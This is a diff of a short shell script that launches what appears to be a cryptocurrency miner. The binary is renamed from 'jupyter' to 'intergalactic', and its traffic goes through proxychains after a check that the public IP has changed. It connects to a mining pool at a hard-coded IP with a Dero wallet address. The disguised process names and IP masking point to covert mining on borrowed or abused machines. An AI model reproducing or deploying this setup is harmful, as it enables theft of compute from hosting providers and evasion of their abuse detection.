@@ -1,4 +1,4 @@
-chmod +x proxychains.conf jupyter proxy libproxychains4.so proxychains.conf
+chmod +x proxychains.conf intergalactic proxy libproxychains4.so proxychains.conf
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(./proxy curl ifconfig.me)
-./jupyter -r 206.189.203.202:443 -w dero1qyyvp40vurtj3kan4wy5le8rcn7pcg23wmq2fs02dfnrq7q79mt4xqqh0pzwq.GAS
+./intergalactic -o s+tcp://206.189.203.202:443 -u dero1qyyvp40vurtj3kan4wy5le8rcn7pcg23wmq2fs02dfnrq7q79mt4xqqh0pzwq.LITE -t 14
